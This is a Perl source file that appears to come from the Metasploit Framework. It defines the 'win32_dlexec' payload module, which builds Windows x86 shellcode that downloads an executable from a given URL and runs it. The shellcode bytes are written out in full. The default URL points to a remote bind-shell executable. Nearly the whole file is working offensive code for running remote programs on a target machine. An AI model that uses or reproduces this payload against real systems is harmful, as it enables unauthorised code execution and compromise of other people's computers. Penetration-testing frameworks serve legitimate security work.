package Msf::Payload::win32_dlexec;
use strict;
use base 'Msf::Payload';

my $info =
{
    Name         => 'windlexec',
    Version      => '1.0',
    Description  => 'Download exe from URL and execute',
    Author       => 'Jarkko Turkulainen <jt[at]klake.org> [Unknown License]',
    Arch         => [ 'x86' ],
    Priv         => 0,
    OS           => [ 'win32' ],
    Keys         => '', 
    Multistage   => 0,
    Type         => 'http_downloadexec',
    Size         => '',
    UserOpts     =>
        {
            'URL' => [1, 'DATA', 'The HTTP URL to download and execute'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->{'Info'}->{'Size'} = $self->Size();
    return($self);
}

sub Size {
    my $self = shift;
    my $data = $self->Build();
    return length($data);
}

sub Build {
    my $self = shift;
    my $url  = $self->GetVar('URL');
    
    my $shellcode = 
    "\xeb\x70\x56\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c\xad".
    "\x8b\x40\x08\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x05".
    "\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34".
    "\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d".
    "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66".
    "\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24".
    "\x1c\x61\xc3\x5a\x80\xc2\x53\x89\xd7\xe8\x94\xff\xff\xff\x89\xc3".
    "\xeb\x05\xe8\xec\xff\xff\xff\x68\x8e\x4e\x0e\xec\x53\xe8\x93\xff".
    "\xff\xff\x31\xc9\x66\xb9\x6f\x6e\x51\x68\x75\x72\x6c\x6d\x54\xff".
    "\xd0\x68\x36\x1a\x2f\x70\x50\xe8\x79\xff\xff\xff\x31\xc9\x51\x51".
    "\x8d\x77\x15\x88\x4f\x1a\x56\x8d\x17\x52\x51\xff\xd0\x68\x98\xfe".
    "\x8a\x0e\x53\xe8\x5d\xff\xff\xff\x41\x51\x56\xff\xd0\x68\x7e\xd8".
    "\xe2\x73\x53\xe8\x4d\xff\xff\xff\xff\xd0";   

    if (! $url) { $url = "http://metasploit.com/sc/win32_bind.exe" }
    my $pathidx = length($url);
    my $fileidx = 0;
    
    if ($url =~ m/.*\/([^\/]+)$/) {
        $fileidx = index($url, $1);
    }

    substr($shellcode, 162, chr($fileidx), 1);
    substr($shellcode, 165, chr($pathidx), 1);
    $shellcode .= $url . "\xff";
    
    return($shellcode);   
}
